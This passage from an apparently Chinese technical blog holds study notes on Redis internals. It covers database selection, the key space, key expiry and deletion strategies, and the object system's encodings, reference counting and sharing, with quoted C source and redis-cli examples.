<p>服务器初始化时，默认创建16个数据库。可以通过修改配置文件的databases选项更改数据库的数量。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># modify /etc/redis/redis.conf</span><br><span class="line">databases 16</span><br></pre></td></tr></table></figure>

<p>客户端可通过<code>config get databases</code>命令查看数据库的数量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get databases</span><br><span class="line">1) &quot;databases&quot;</span><br><span class="line">2) &quot;16&quot;</span><br></pre></td></tr></table></figure>

<h3><span id="客户端切换数据库">客户端切换数据库</span></h3><p>每个客户端都有自己的目标数据库，默认情况下客户端的目标数据库为0号数据库。客户端可以通过执行<code>SELECT [dbid]</code> 命令切换目标数据库。</p>
<p>Redis服务器中，使用redisClient结构(6.0版本此结构体名称改为client)表示客户端属性，结构中的db属性表示客户端的目标数据库，如下：;</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisClient</span> &#123;</span></span><br><span class="line">	redisDb *db;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125; redisClient;</span><br></pre></td></tr></table></figure>

<p>通过修改db指针，指向redisServer.db数组中的某个元素，来实现目标数据库的切换，源码参考<code>db.c/selectDb</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">selectDb</span><span class="params">(redisClient *c, <span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (id &lt; <span class="number">0</span> || id &gt;= server.dbnum)</span><br><span class="line">        <span class="keyword">return</span> REDIS_ERR;</span><br><span class="line">    c-&gt;db = &amp;server.db[id];	<span class="comment">// 通过修改db指针，指向redisServer.db数组中的某个元素，实现目标数据库的切换</span></span><br><span class="line">    <span class="keyword">return</span> REDIS_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="数据库键空间-增删改查操作">数据库键空间、增删改查操作</span></h3><p>Redis是一个Key-Value型数据库，服务器中的每个数据库都由一个redisDb结构表示，其中redisDb结构的dict字典保存了数据库中的所有键值对，将这个字典称为<strong>键空间</strong>(key space)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisDb</span> &#123;</span></span><br><span class="line">	dict *dict;		<span class="comment">// 数据库键空间，保存数据库中所有键值对</span></span><br><span class="line">	dict *expires;	<span class="comment">// 过期字典</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>以下介绍Redis数据库增、删、改、查操作的实现：</p>
<h4><span id="查询键的实现">查询键的实现</span></h4><p>在键空间中查询给定键是否存在， 通过lookupKey函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">lookupKey</span><span class="params">(redisDb *db, robj *key)</span> &#123;</span><br><span class="line">    dictEntry *de = dictFind(db-&gt;dict,key-&gt;ptr);</span><br><span class="line">    <span class="keyword">if</span> (de) &#123;        </span><br><span class="line">        robj *val = dictGetVal(de);  <span class="comment">// 如果键存在，就取出值</span></span><br><span class="line">        <span class="comment">// 更新时间信息（只在不存在子进程时执行，充分利用写时复制机制）</span></span><br><span class="line">        <span class="keyword">if</span> (server.rdb_child_pid == <span class="number">-1</span> &amp;&amp; server.aof_child_pid == <span class="number">-1</span>)</span><br><span class="line">            val-&gt;lru = LRU_CLOCK();</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="增加键的实现">增加键的实现</span></h4><p> 将新键值对添加到键空间，通过dbAdd函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dbAdd</span><span class="params">(redisDb *db, robj *key, robj *val)</span> &#123;</span><br><span class="line">    sds copy = sdsdup(key-&gt;ptr);</span><br><span class="line">    <span class="type">int</span> retval = dictAdd(db-&gt;dict, copy, val);	<span class="comment">// 增加键值对</span></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4><span id="删除键的实现">删除键的实现</span></h4><p>删除给定的键，注意需同时删除这个键的过期时间， 通过dbDelete函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dbDelete</span><span class="params">(redisDb *db, robj *key)</span> &#123; </span><br><span class="line">    <span class="keyword">if</span> (dictSize(db-&gt;expires) &gt; <span class="number">0</span>) dictDelete(db-&gt;expires,key-&gt;ptr); <span class="comment">// 先删除键的过期时间</span></span><br><span class="line">    <span class="keyword">if</span> (dictDelete(db-&gt;dict,key-&gt;ptr) == DICT_OK) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 删除成功返回1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 删除失败返回0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="更新键的实现">更新键的实现</span></h4><p>通过dbOverwrite函数实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setKey</span><span class="params">(redisDb *db, robj *key, robj *val)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (lookupKeyWrite(db,key) == <span class="literal">NULL</span>) &#123;	<span class="comment">// 如果key不存在，新增键值对</span></span><br><span class="line">        dbAdd(db,key,val);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 如果key已经存在，更新键值对</span></span><br><span class="line">        dbOverwrite(db,key,val);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dbOverwrite</span><span class="params">(redisDb *db, robj *key, robj *val)</span> &#123;</span><br><span class="line">    dictEntry *de = dictFind(db-&gt;dict,key-&gt;ptr);</span><br><span class="line">	redisAssertWithInfo(<span class="literal">NULL</span>,key,de != <span class="literal">NULL</span>);</span><br><span class="line">	dictReplace(db-&gt;dict, key-&gt;ptr, val);	<span class="comment">// 更新键空间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="其他对键空间的操作">其他对键空间的操作</span></h4><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">FLUSHALL</td>
<td align="left">清空所有数据库</td>
</tr>
<tr>
<td align="left">FLUSHDB</td>
<td align="left">清空目标数据库</td>
</tr>
<tr>
<td align="left">RANDOMKEY</td>
<td align="left">随机返回一个键</td>
</tr>
<tr>
<td align="left">DBSIZE</td>
<td align="left">返回目标数据库的键值对数量</td>
</tr>
<tr>
<td align="left">EXISTS [key]</td>
<td align="left">判断键是否存在</td>
</tr>
</tbody></table>
<h3><span id="键的生存时间">键的生存时间</span></h3><h4><span id="如何设置键的生存时间">如何设置键的生存时间？</span></h4><p><strong>expire, pexpire</strong>命令以秒&#x2F;毫秒为精度，对数据库的某个键设置生存时间(Time to Live：TTL)。经过指定的时间后，服务器会自动删除生存时间为0的键。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; expire key 5	# 设置生存时间为5秒，5秒后服务器自动删除这个键</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; TTL key			# TTL命令返回这个键的生存时间，单位:秒</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; get key			# 5秒后，键过期，被服务器自动删除</span><br><span class="line">(nil)</span><br></pre></td></tr></table></figure>

<p>Redis中，可以使用<strong>expire, pexpire, expireat, pexpireat</strong>设置键的生存时间，用法如下：</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">expire [key] [ttl]</td>
<td align="left">设置键的生存时间为ttl秒</td>
</tr>
<tr>
<td align="left">pexpire [key] [ttl]</td>
<td align="left">设置键的生存时间为ttl毫秒</td>
</tr>
<tr>
<td align="left">expireat [key] [timestamp]</td>
<td align="left">设置过期时间为秒级时间戳</td>
</tr>
<tr>
<td align="left">pexpireat [key] [timestamp]</td>
<td align="left">设置过期时间为毫秒级时间戳</td>
</tr>
</tbody></table>
<p>Redis源码实现中，expire, pexpire, expireat命令最终都会转化为pexpireat命令，相关源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">expireCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// expire 命令</span></span><br><span class="line">    expireGenericCommand(c,mstime(),UNIT_SECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">expireatCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// expireat 命令</span></span><br><span class="line">    expireGenericCommand(c,<span class="number">0</span>,UNIT_SECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pexpireCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// pexpire 命令</span></span><br><span class="line">    expireGenericCommand(c,mstime(),UNIT_MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pexpireatCommand</span><span class="params">(redisClient *c)</span> &#123;				<span class="comment">// pexpireat 命令</span></span><br><span class="line">    expireGenericCommand(c,<span class="number">0</span>,UNIT_MILLISECONDS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">expireGenericCommand</span><span class="params">(redisClient *c, <span class="type">long</span> <span class="type">long</span> basetime, <span class="type">int</span> unit)</span>;</span><br></pre></td></tr></table></figure>

<h4><span id="time命令介绍">TIME命令介绍</span></h4><p>time命令用于返回当前服务器时间，返回值包含两个字符串，意义如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; TIME</span><br><span class="line">1) &quot;1615638731&quot;			# 表示当前时间，格式为UNIX时间戳</span><br><span class="line">2) &quot;628667&quot;				# 表示当前这一秒中，已经流逝的微秒数，1秒=1000000微妙，这个值总小于1000000</span><br></pre></td></tr></table></figure>

<h4><span id="redis如何保存过期时间">redis如何保存过期时间？</span></h4><p>redisDb结构的expires字典保存了数据库中所有键的过期时间，这个expire字典我们称之为<strong>过期字典</strong>。</p>
<ul>
<li>过期字典的键是一个指针，指向键空间的某个键对象</li>
<li>过期字典的值是一个long long类型整数，毫秒精度的UNIX时间戳。</li>
</ul>
<p>pexpireat命令在过期字典中查找给定键，并设置值为过期时间(格式为UNIX时间戳)；具体实现可参考expireGenericCommand函数。</p>
<h4><span id="redis如何移除过期时间">redis如何移除过期时间？</span></h4><p>persist命令可以移除一个键的过期时间， 效果相当于反向执行pexpireat命令：在过期字典中查找给定键，删除这个键对应的值；具体实现可参考persistCommand函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; EXPIRE key 100		# 设置key的生存时间100秒</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; TTL key				# 返回生存时间</span><br><span class="line">(integer) 97</span><br><span class="line">127.0.0.1:6379&gt; PERSIST key			# 移除key的生存时间</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; TTL key				# 生存时间为-1, 表示为永久键</span><br><span class="line">(integer) -1</span><br></pre></td></tr></table></figure>

<h4><span id="怎么判断一个key是否过期">怎么判断一个key是否过期</span></h4><p>TTL命令以秒为单位返回键的生存时间，PTTL命令以毫秒为单位返回键的生存时间。</p>
<p>TTL、PTTL命令<strong>通过计算键的过期时间和当前时间的差</strong>来实现。</p>
<p>判断一个key是否过期的步骤如下，具体实现可以参考expireIfNeeded函数：</p>
<ul>
<li>首先，检查给定键是否在过期字典中，如果存在，取得键的过期时间</li>
<li>其次，检查当前UNIX时间戳是否大于键的过期时间，如果大于表示已过期。</li>
</ul>
<h3><span id="过期键删除策略">过期键删除策略</span></h3><p>有三种常见的过期键删除策略，分别如下：</p>
<ul>
<li>定时删除：设置键过期时间的同时创建一个定时器，定时器超时后立即删除该键。</li>
<li>惰性删除：放任键过期不管，直到需要读写改键时才检查是否过期，如过期就删除该键。</li>
<li>定期删除：每隔一段时间，对数据库做一次检查，删除过期的键。</li>
</ul>
<p>三种策略的优缺点分析：</p>
<ul>
<li><p>定时删除：对内存友好，对CPU不友好，影响服务器的响应时间和吞吐量。</p>
</li>
<li><p>惰性删除：对CPU友好，但浪费内存，可能导致内存泄漏。</p>
</li>
<li><p>定期删除：是对前两种策略的折中，其难点在于确定删除操作执行时长和频率。</p>
</li>
</ul>
<h4><span id="redis使用的过期键删除策略">Redis使用的过期键删除策略</span></h4><p>Redis综合使用了惰性删除和定期删除这两种策略，策略具体实现如下：</p>
<h4><span id="惰性删除">惰性删除</span></h4><p>Redis的惰性删除策略在expireIfNeed函数实现，所有读写数据库的命令在执行之前都会调用expireIfNeeded函数对输入键进行检查：</p>
<ul>
<li>如果输入键已经过期，expireIfNeeded函数将输入键删除，命令当做键不存在的情况去执行。</li>
<li>如果输入键未过期，expireIfNeed函数什么也不做，继续执行实际的命令流程。</li>
</ul>
<h4><span id="定期删除">定期删除</span></h4><p>过期键的定期删除策略由redis.c&#x2F;activeExpireCycle函数实现。每当Redis的时间事件serverCron函数周期性执行时，activeExpireCycle函数就随之被调用。 这个周期默认为0.1秒，可以通过配置文件的hz选项修改这个值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># modify /etc/redis/redis.conf</span><br><span class="line"># The range is between 1 and 500, however a value over 100 is usually not</span><br><span class="line"># a good idea. Most users should use the default of 10 and raise this up to</span><br><span class="line"># 100 only in environments where very low latency is required.</span><br><span class="line">hz 10</span><br></pre></td></tr></table></figure>

<p>activeExpireCycle函数的实现原理：在规定时间内，分多次遍历服务器中的数据库，从数据库的expires字典中随机检查一部分键的过期时间，并删除其中的过期键。</p>
<h3><span id="参考资料">参考资料</span></h3><p>《Redis设计与实现》第9章 数据库</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(六)——对象系统</title>
    <url>/2021/0123194036.html</url>
    <content><![CDATA[<h3><span id="前言">前言</span></h3><p>Redis没有直接使用基础数据结构来实现数据库，而是基于这些数据结构创建了一个对象系统。这个系统包含字符串对象、列表对象、哈希对象、集合对象、有序集合对象。</p>
<h3><span id="1-redis30中的6种基础数据结构">1. Redis3.0中的6种基础数据结构</span></h3><span id="more"></span>

<table>
<thead>
<tr>
<th align="left">数据结构</th>
<th align="left">应用场景</th>
</tr>
</thead>
<tbody><tr>
<td align="left">简单动态字符串</td>
<td align="left">保存字符串值</td>
</tr>
<tr>
<td align="left">链表</td>
<td align="left">列表键，发布与订阅，慢查询，监视器</td>
</tr>
<tr>
<td align="left">字典</td>
<td align="left">哈希键，数据库键空间</td>
</tr>
<tr>
<td align="left">跳跃表</td>
<td align="left">有序集合键</td>
</tr>
<tr>
<td align="left">整数集合</td>
<td align="left">集合键</td>
</tr>
<tr>
<td align="left">压缩列表</td>
<td align="left">列表键、哈希键</td>
</tr>
</tbody></table>
<h3><span id="2-对象的类型和编码">2. 对象的类型和编码</span></h3><p>Redis使用对象表示数据库中的键和值，每次在Redis新建一个键值对都会创建两个对象，<strong>键对象和值对象</strong>。</p>
<p>Redis中的每个对象由一个<code>struct redisObject</code>结构表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/redis.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisObject</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> type:<span class="number">4</span>;			    <span class="comment">// 类型</span></span><br><span class="line">    <span class="type">unsigned</span> encoding:<span class="number">4</span>;			<span class="comment">// 编码</span></span><br><span class="line">    <span class="type">unsigned</span> lru:<span class="number">24</span>;				<span class="comment">// 记录对象最后一次被命令程序访问的时间</span></span><br><span class="line">    <span class="type">int</span> refcount;					<span class="comment">// 引用计数</span></span><br><span class="line">    <span class="type">void</span> *ptr;						<span class="comment">// 指向底层实现数据结构的指针</span></span><br><span class="line">&#125; robj;</span><br></pre></td></tr></table></figure>

<p>其中type属性表示对象类型， encoding属性表示对象编码。以下介绍对象类型和对象编码的概念。</p>
<h4><span id="21-对象类型">2.1 对象类型</span></h4><p>Redis 3.0中，定义如下5种对象类型：</p>
<table>
<thead>
<tr>
<th align="left">类型常量</th>
<th align="left">对象名称</th>
<th align="left">TYPE命令的输出</th>
</tr>
</thead>
<tbody><tr>
<td align="left">REDIS_STRING</td>
<td align="left">字符串</td>
<td align="left">“string”</td>
</tr>
<tr>
<td align="left">REDIS_LIST</td>
<td align="left">列表</td>
<td align="left">“list”</td>
</tr>
<tr>
<td align="left">REDIS_SET</td>
<td align="left">集合</td>
<td align="left">“set”</td>
</tr>
<tr>
<td align="left">REDIS_ZSET</td>
<td align="left">有序集合</td>
<td align="left">“zset”</td>
</tr>
<tr>
<td align="left">REDIS_HASH</td>
<td align="left">哈希</td>
<td align="left">“hash”</td>
</tr>
</tbody></table>
<p>注意，对于Redis中的任一键值对，键总是一个字符串对象，而值可以是上面5种对象的任意一种。比如说，列表键的意思是指，这个键对应的值是列表对象，其他类型对象以此类推。</p>
<p><code>TYPE</code>命令用于返回对象类型。</p>
<h4><span id="22-对象编码">2.2 对象编码</span></h4><p>redisObject中的ptr指针指向对象使用的基础数据结构，而具体使用何种数据结构是由对象编码决定的。</p>
<p>encoding属性用于表示对象编码，说明这个对象使用的是何种数据结构。Redis 3.0中，encoding值可以是如下的任何一种：</p>
<table>
<thead>
<tr>
<th align="left">encoding</th>
<th align="left">使用的底层数据结构</th>
</tr>
</thead>
<tbody><tr>
<td align="left">REDIS_ENCODING_RAW</td>
<td align="left">SDS</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_INT</td>
<td align="left">long类型数</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_HT</td>
<td align="left">字典</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_LINKEDLIST</td>
<td align="left">双端链表</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_ZIPLIST</td>
<td align="left">压缩列表</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_INTSET</td>
<td align="left">整数集合</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_SKIPLIST</td>
<td align="left">跳表</td>
</tr>
<tr>
<td align="left">REDIS_ENCODING_EMBSTR</td>
<td align="left">EMBSTR编码的SDS</td>
</tr>
</tbody></table>
<p><code>OBJECT ENCODING</code>命令用于查看某个数据库键的值对象的编码。</p>
<p>每种类型的对象都使用了至少两种不同的编码，这使得Redis可以优化对象在不同场景下的效率和空间占用。</p>
<h4><span id="23-不同类型和编码的对象">2.3 不同类型和编码的对象</span></h4><table>
<thead>
<tr>
<th align="left">对象类型</th>
<th align="left">可能的编码类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">字符串</td>
<td align="left">long, embstr,raw</td>
</tr>
<tr>
<td align="left">列表</td>
<td align="left">压缩列表、双端链表</td>
</tr>
<tr>
<td align="left">哈希</td>
<td align="left">压缩列表、字典</td>
</tr>
<tr>
<td align="left">集合</td>
<td align="left">整数集合、字典</td>
</tr>
<tr>
<td align="left">有序集合</td>
<td align="left">压缩列表、跳表</td>
</tr>
</tbody></table>
<h3><span id="2-redis中的五种对象类型">2. Redis中的五种对象类型</span></h3><h4><span id="21-字符串对象">2.1 字符串对象</span></h4><p>字符串对象有三种编码，可以是int, embstr, raw。使用何种编码是通过字符串对象保存的值类型和字符串长度决定，规则如下：</p>
<ul>
<li>如果保存的是整数值，且整数不超过long范围，使用int编码</li>
<li>如果保存的是字符串值，且字符串长度 &gt; 39， 使用raw编码</li>
<li>如果保存的是字符串值，且字符串长度 &lt;&#x3D; 39，使用embstr编码</li>
</ul>
<p>对应redis源码中<code>CreateStringObject</code>的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REDIS_ENCODING_EMBSTR_SIZE_LIMIT 39</span></span><br><span class="line">robj *<span class="title function_">createStringObject</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= REDIS_ENCODING_EMBSTR_SIZE_LIMIT)</span><br><span class="line">        <span class="keyword">return</span> createEmbeddedStringObject(ptr,len);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> createRawStringObject(ptr,len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5><span id="211-为什么需要embstr编码">2.1.1 为什么需要embstr编码？</span></h5><p>embstr编码是专门为保存短字符串的一种优化编码方式。和raw编码区别在于，embstr编码仅调用一次内存分配函数同时创建redisObject和sdshdr结构，优势如下：</p>
<ul>
<li>内存分配、内存回收次数由两次降为一次。</li>
<li>redisObject结构和sdshdr结构的内存是连续的、因此能更好地利用缓存。</li>
</ul>
<p>以下分别给出raw编码和embstr编码的字符串对象示意图：</p>
<p>raw编码字符串：</p>
<p><img data-src="/2021/0123194036/image1.png"></p>
<p>embstr编码字符串：<br><img data-src="/2021/0123194036/image2.png"></p>
<h5><span id="212-编码的转换">2.1.2 编码的转换</span></h5><p>如果对int , embstr编码的字符串执行append操作，它们总是会转换为raw编码的字符串, 理由如下：</p>
<ul>
<li><p>对int编码字符串做了append操作后，这个对象保存的就不再是整数值，所以编码必须发生转换。</p>
</li>
<li><p>对于embstr编码，Redis没有为embstr编码的字符串对象编写任何修改其内容的代码，所以append操作后embstr编码总转换成raw。也就是说，embstr编码的字符串为只读对象。</p>
</li>
</ul>
<h4><span id="22-列表对象">2.2 列表对象</span></h4><p>列表对象编码可以是ziplist或linkedlist，创建列表对象代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">createListObject</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line">robj *<span class="title function_">createZiplistObject</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>

<h5><span id="221-编码的转换">2.2.1 编码的转换</span></h5><p>当列表对象同时满足以下两个条件时，列表对象使用ziplist编码，否则使用linkedlist编码</p>
<ul>
<li>列表对象保存的所有字符串元素的长度都小于64字节</li>
<li>列表对象保存的元素个数小于512个</li>
</ul>
<p>以上条件可以通过配置文件修改，相关配置项：<code>list-max-ziplist-value, list-max-ziplist-entries</code></p>
<h4><span id="23-哈希对象">2.3 哈希对象</span></h4><p>哈希对象编码可以是ziplist或hashtable，创建对象代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">robj *<span class="title function_">createHashObject</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>

<h5><span id="231-编码的转换">2.3.1 编码的转换</span></h5><p>当哈希对象同时满足以下两个条件时，哈希对象使用ziplist编码，否则使用hashtable编码</p>
<ul>
<li>哈希对象保存的所有键值对的键和值长度都小于64字节</li>
<li>哈希对象保存的键值对数少于512个</li>
</ul>
<p>以上条件可以通过配置文件修改，相关配置项：<code>hash-max-ziplist-value, hash-max-ziplist-entries</code></p>
<h4><span id="24-集合对象">2.4 集合对象</span></h4><p>集合对象编码可以是intset或hashtable</p>
<h5><span id="241-编码的转换">2.4.1 编码的转换</span></h5><p>当集合对象可以同时满足以下两个条件时，对象使用intset编码，否则使用hashtable编码</p>
<ul>
<li>集合对象保存的都是整数值。</li>
<li>集合对象保存的元素数量不超过512个。</li>
</ul>
<p>以上条件可以通过配置文件修改, 相关配置项：<code>set-max-intset-entries</code></p>
<h4><span id="25-有序集合对象">2.5 有序集合对象</span></h4><p>有序集合对象编码可以是ziplist或skiplist</p>
<p>基于skiplist编码的数据结构如下，可以看到有序集合对象同时使用了跳表和字典数据结构来实现。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">zset</span> &#123;</span></span><br><span class="line">	zskiplist *zsl;</span><br><span class="line">	dict *dict;</span><br><span class="line">&#125; zset;</span><br></pre></td></tr></table></figure>

<p>有序集合元素同时保存在跳表和字典，示意图如下：<br><img data-src="/2021/0123194036/image3.png"></p>
<p>图中字典和跳表重复列出了各元素的成员和分数，而源码实现中，字典和跳表会共享元素的成员和分数，不会导致内存浪费。</p>
<h5><span id="251-为什么有序集合需要同时使用跳跃表和字典来实现">2.5.1 为什么有序集合需要同时使用跳跃表和字典来实现？</span></h5><ul>
<li><p>如只使用字典，因为字典是无序的，执行范围操作时须先排序，复杂度O(NlogN)，以及额外O(N)空间。</p>
</li>
<li><p>如只使用跳表，那么根据成员查找分数的操作效率较低，其复杂度为O(logN)。</p>
</li>
</ul>
<h5><span id="252-编码的转换">2.5.2 编码的转换</span></h5><p>有序集合对象可以同时满足以下两个条件，对象使用ziplist编码，否则使用skiplist编码</p>
<ul>
<li>有序集合保存元素数量小于128个。</li>
<li>有序集合保存的所有元素成员都小于64个字节。</li>
</ul>
<p>以上条件可以通过配置文件修改，相关配置项：<code>zset-max-ziplist-entries，zset-max-ziplist-value</code></p>
<h3><span id="3-内存回收机制">3. 内存回收机制</span></h3><p>Redis是通过C语言实现的，C语言没有内存自动回收机制，因此Redis在对象系统中通过引用计数方式实现内存回收机制。</p>
<p>每个对象的引用计数信息通过redisObject结构中的refcount属性表示：</p>
<ul>
<li>创建新对象时，引用计数初始为1</li>
<li>对象被新程序使用时，引用计数加1，参考 <code>object.c/incrRefCount</code></li>
<li>对象不再被程序使用时，引用计数减1，当引用计数减为0时回收内存，参考<code>object.c/decrRefCount</code></li>
</ul>
<p><code>OBJECT REFCOUNT</code>命令可以查看对象的引用计数。</p>
<h3><span id="4-对象共享机制">4. 对象共享机制</span></h3><p>对象的refcount属性除了用于实现内存回收机制外，还具有共享内存的作用。</p>
<p>比如，Redis服务器启动时会预先创建0 ~ 9999这1万个字符串对象。当redis需用到0 ~ 9999的字符串对象时，直接使用共享对象，不必每次都创建新对象，从而节约内存。源码参考<code>object.c/createStringObjectFromLongLong</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// object.c</span></span><br><span class="line">robj *<span class="title function_">createStringObjectFromLongLong</span><span class="params">(<span class="type">long</span> <span class="type">long</span> value)</span> &#123;</span><br><span class="line">    robj *o;</span><br><span class="line">    <span class="comment">// 如果value的大小符合 REDIS 共享整数的范围，直接使用共享对象，不用创建新对象</span></span><br><span class="line">    <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt; REDIS_SHARED_INTEGERS) &#123;</span><br><span class="line">        incrRefCount(shared.integers[value]);</span><br><span class="line">        o = shared.integers[value];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="comment">// 不在0 ~ 9999范围内，创建新的整数对象，以下代码省略</span></span><br><span class="line">        <span class="comment">// .......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4><span id="41-为什么redis只共享包含整数的对象">4.1 为什么Redis只共享包含整数的对象？</span></h4><ul>
<li>redis只共享包含数字的对象，是因为数字的复用场景最多。</li>
<li>出于CPU限制。在使用一个共享对象前，需要判断共享对象和目前对象是否相等。一个共享对象的值越复杂，这个判断的时间复杂度越高，越消耗CPU性能，注意到：<ul>
<li>数字比较复杂度仅为O(1)</li>
<li>字符串比较复杂度为O(n)</li>
<li>对于更复杂的列表和哈希对象，比较复杂度上升到O(n ^ 2)。</li>
</ul>
</li>
</ul>
<h3><span id="5-对象的空转时长">5. 对象的空转时长</span></h3><p><code>RedisObject</code>的lru属性记录对象最后一次被命令程序访问的时间，可用于计算某个数据库键的空转时长。</p>
<p><code>OBJECT LDLETIME</code>命令用于获取对象的空转时长，空转时长是通过当前时间减去对象的lru值计算得出。</p>
<p>空转时长可用于Redis服务器回收内存算法，原则是内存不足时，空转时长高的键优先被服务器释放，回收内存。</p>
<h3><span id="总结">总结</span></h3><ul>
<li>Redis的对象系统包含五种基本对象：字符串对象、列表对象、哈希对象、集合对象、有序集合对象。</li>
<li>每种类型的对象都使用了至少两种不同的编码，这使得Redis可以针对不同的场景，为对象设置多种不同的数据结构，优化对象在不同场景下的效率。</li>
<li>Redis对象实现了基于引用计数的内存回收机制，对象共享机制，从而节约内存。</li>
<li>Redis的对象带有访问事件记录信息，用于计算数据库键的空转时长，空转时长可以用于服务器的内存回收算法。</li>
</ul>
<h3><span id="参考资料">参考资料</span></h3><p>《Redis设计与实现》 —— 第8章 对象</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode几道链表题解决思路</title>
    <url>/2021/0206194352.html</url>
    <content><![CDATA[<h3><span id="前言">前言</span></h3><p>LeetCode链表题汇总，记录解题思路，C&#x2F;C++语言实现。</p>
<h3><span id="leetcode链表题">LeetCode链表题</span></h3><ul>
<li><p>判断链表是否有环 ：<a href="https://leetcode-cn.com/problems/linked-list-cycle/">https://leetcode-cn.com/problems/linked-list-cycle/</a></p>
</li>
